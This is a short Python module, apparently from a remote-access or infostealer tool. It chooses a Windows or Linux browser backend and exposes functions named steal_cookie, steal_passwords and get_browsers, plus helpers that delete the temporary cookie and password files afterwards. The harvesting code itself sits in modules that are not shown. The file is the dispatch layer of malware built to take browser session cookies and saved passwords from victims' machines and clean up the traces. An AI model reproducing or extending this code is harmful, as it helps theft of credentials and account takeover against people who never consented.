import config
import constants


if config.os_name == constants.Windows_OS:
    from modules import Browser_windows as current_browser
if config.os_name == constants.Linux_OS:
    from modules import Browser_linux as current_browser


def open_url(url):
    return current_browser.open_url(url)


def steal_cookie():
    return current_browser.steal_cookie()


def delete_tmp_cookies():
    return current_browser.delete_tmp_cookies()


def get_browsers():
    return current_browser.get_browsers()


def steal_passwords():
    return current_browser.steal_passwords()


def delete_tmp_passwords():
    return current_browser.delete_tmp_passwords()


modes = current_browser.modes
